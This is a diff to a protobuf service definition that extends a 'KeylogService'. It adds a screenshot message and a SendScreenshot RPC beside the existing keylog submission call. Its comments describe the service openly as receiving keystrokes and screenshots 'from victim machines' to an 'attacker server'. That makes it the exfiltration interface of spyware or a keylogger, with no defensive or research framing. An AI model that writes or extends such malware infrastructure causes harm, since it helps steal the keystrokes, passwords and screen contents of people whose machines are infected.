@@ -1,10 +1,33 @@
 syntax = "proto3";
+
+// Request message containing a keylog entry
 message KeylogRequest {
   string message = 1;
 }
+
+// Response message for keylog submission
 message KeylogResponse {
   bool response = 1;
 }
+
+// Request message containing screenshot data
+message ScreenshotRequest {
+  bytes image_data = 1; // Raw image bytes (PNG/JPEG)
+  string filename = 2; // Original filename
+  string timestamp = 3; // Capture timestamp
+  string client_id = 4; // Unique client identifier
+}
+
+// Response message for screenshot submission
+message ScreenshotResponse {
+  bool success = 1; // Whether the screenshot was saved successfully
+  string message = 2; // Status message or error description
+}
+
+// Service for receiving keylogs and screenshots from victim machines
 service KeylogService {
+  // Send a keylog message from victim to attacker server
   rpc SendKeylog (KeylogRequest) returns (KeylogResponse);
+  // Send a screenshot from victim to attacker server
+  rpc SendScreenshot (ScreenshotRequest) returns (ScreenshotResponse);
 }
